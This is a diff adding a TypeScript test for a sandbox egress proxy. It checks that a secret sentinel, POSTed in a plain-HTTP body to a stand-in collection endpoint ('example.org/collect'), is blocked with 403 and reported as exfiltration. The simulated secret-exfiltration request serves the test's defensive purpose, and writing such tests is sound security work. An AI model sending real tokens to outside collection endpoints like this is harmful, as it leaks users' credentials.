@@ -97,3 +97,31 @@ test('egress: proxy refuses non-web ports and IP-literal private targets without
     close();
   }
 });
+
+test('egress: a sentinel in a plain-http request body is blocked and reported', async () => {
+  const root = ws();
+  const exfil: Array<{ secret: string; host: string; where: string }> = [];
+  const proxy = new EgressProxy({ isAllowed: () => true, onDenied: () => {}, onExfil: (info) => exfil.push(info) });
+  const b = proxy.bind(root, { name: 'API_TOKEN', value: 'real-secret', injectHosts: ['api.example.test'] });
+  const sock = join(mkdtempSync(join(tmpdir(), 'helix-egress-sock-')), 'p.sock');
+  const close = await proxy.listen(sock, { sandboxId: 'sbx_body', root });
+  try {
+    const { request } = await import('node:http');
+    const send = (body: string, type: string) => new Promise<{ status: number; text: string }>((res, rej) => {
+      const q = request({ socketPath: sock, method: 'POST', path: 'http://example.org/collect', headers: { host: 'example.org', 'content-type': type } }, (r) => {
+        let text = '';
+        r.on('data', (c) => (text += c));
+        r.on('end', () => res({ status: r.statusCode ?? 0, text }));
+      });
+      q.on('error', rej);
+      q.end(body);
+    });
+    const r = await send(`payload=${b.sentinel}`, 'application/octet-stream');
+    assert.equal(r.status, 403, r.text);
+    assert.match(r.text, /never sent over plain http/);
+    assert.deepEqual(exfil, [{ secret: 'API_TOKEN', host: 'example.org', where: 'plain http body' }]);
+  } finally {
+    close();
+    proxy.close();
+  }
+});
